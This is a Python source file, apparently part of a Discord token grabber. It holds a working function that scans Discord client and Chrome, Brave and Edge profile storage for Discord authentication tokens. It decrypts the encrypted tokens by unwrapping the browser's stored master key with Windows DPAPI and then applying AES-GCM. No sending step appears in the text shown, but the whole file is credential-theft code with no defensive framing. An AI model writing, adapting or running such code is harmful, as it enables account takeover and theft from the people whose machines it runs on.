import os
import re
import json
import base64

try:
    import win32crypt
except:
    win32crypt = None

try:
    from Crypto.Cipher import AES
except:
    AES = None

def get_discord_tokens_complete():
    LOCAL = os.getenv("LOCALAPPDATA") or ""
    ROAMING = os.getenv("APPDATA") or ""

    PATHS = {
        'Discord': os.path.join(ROAMING, 'discord'),
        'Discord Canary': os.path.join(ROAMING, 'discordcanary'),
        'Discord PTB': os.path.join(ROAMING, 'discordptb'),
        'Chrome': os.path.join(LOCAL, "Google", "Chrome", "User Data"),
        'Brave': os.path.join(LOCAL, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    }

    def getkey(path):
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8", errors="ignore") as f:
                return json.loads(f.read())['os_crypt']['encrypted_key']
        except:
            return None

    def gettokens(path):
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        tokens = []
        if not os.path.exists(leveldb_path):
            return tokens
        for file in os.listdir(leveldb_path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue
            try:
                with open(os.path.join(leveldb_path, file), "r", errors="ignore") as f:
                    content = f.read()
                    for enc in re.findall(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", content):
                        tokens.append("dQw4w9WgXcQ:" + enc)
                    for raw in re.findall(r"mfa\.[\w-]{84}", content):
                        tokens.append(raw)
                    for raw in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content):
                        tokens.append(raw)
            except:
                continue
        return tokens

    def decrypt_token(encrypted_token, key):
        try:
            if win32crypt is None or AES is None:
                return encrypted_token if not encrypted_token.startswith("dQw4w9WgXcQ:") else None
            if encrypted_token.startswith("dQw4w9WgXcQ:"):
                k = base64.b64decode(key)[5:]
                k = win32crypt.CryptUnprotectData(k, None, None, None, 0)[1]
                data = base64.b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])
                nonce = data[3:15]
                ciphertext = data[15:-16]
                cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt(ciphertext)
                return decrypted.decode('utf-8', errors='ignore')
            else:
                return encrypted_token
        except:
            return None

    tokens = []
    for name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        key = getkey(path)
        for enc_token in gettokens(path):
            try:
                if enc_token.startswith("dQw4w9WgXcQ:"):
                    if not key:
                        continue
                    token = decrypt_token(enc_token, key)
                else:
                    token = enc_token
                if token and token not in tokens and len(token) > 20:
                    tokens.append(token)
            except:
                continue
    return tokens
